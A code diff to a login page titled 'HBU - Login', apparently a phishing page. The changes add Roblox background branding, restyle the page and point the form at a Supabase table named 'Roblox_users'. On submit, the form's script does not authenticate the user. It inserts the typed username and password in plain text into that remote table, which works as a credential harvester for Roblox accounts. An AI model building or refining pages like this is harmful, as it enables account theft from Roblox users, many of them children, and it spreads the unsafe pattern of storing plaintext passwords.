@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HBU - Login</title>
   <!-- Load Supabase JS SDK from CDN -->
-  <script src="https://jsdelivr.net"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     * {
       box-sizing: border-box;
@@ -13,11 +13,16 @@
     }
     body {
       margin: 0;
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       background-color: #000000;
+      background-image: url("Roblox_BG.jpg");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
     }
     .login-card {
       background: #111827;
@@ -73,7 +78,7 @@
       margin-top: 1rem;
       text-align: center;
       font-size: 0.9rem;
-      color: #374151;
+      color: #d1d5db;
     }
   </style>
 </head>
@@ -108,14 +113,15 @@
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      statusText.textContent = 'Logging in...d';
+      statusText.style.color = '#d1d5db';
+      statusText.textContent = 'Logging in...';
 
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // 2. REPLACE 'roblox_users' WITH YOUR TABLE NAME
+      // 2. REPLACE 'Roblox_users' WITH YOUR TABLE NAME
       const { data, error } = await supabaseClient
-        .from('roblox_users')
+        .from('Roblox_users')
         .insert([
           { username: username, password: password }
         ]);
